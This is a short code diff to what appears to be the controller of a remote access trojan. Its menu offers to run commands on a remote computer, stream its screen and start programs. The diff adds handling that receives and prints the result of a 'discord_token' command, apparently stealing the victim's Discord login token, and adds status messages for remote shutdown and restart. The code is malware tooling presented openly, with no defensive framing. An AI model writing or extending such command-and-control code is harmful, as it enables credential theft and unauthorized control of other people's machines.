@@ -27,16 +27,19 @@ while True:
                 cmd - run a command on the computer
                 stream - stream the computer's screen
                 start - start a program''')
-        conn.send(cmd.encode())
 
     if cmd == 'discord_token':
         conn.send(cmd.encode())
+        answer = conn.recv(1024).decode()
+        print(answer)
     
     elif cmd == 'shutdown':
         conn.send(cmd.encode())
+        print('Computer will shutdown in 5 seconds')
     
     elif cmd == 'restart':
         conn.send(cmd.encode())
+        print('Computer will restart in 5 seconds')
 
     elif cmd == 'sleep':
         conn.send(cmd.encode())
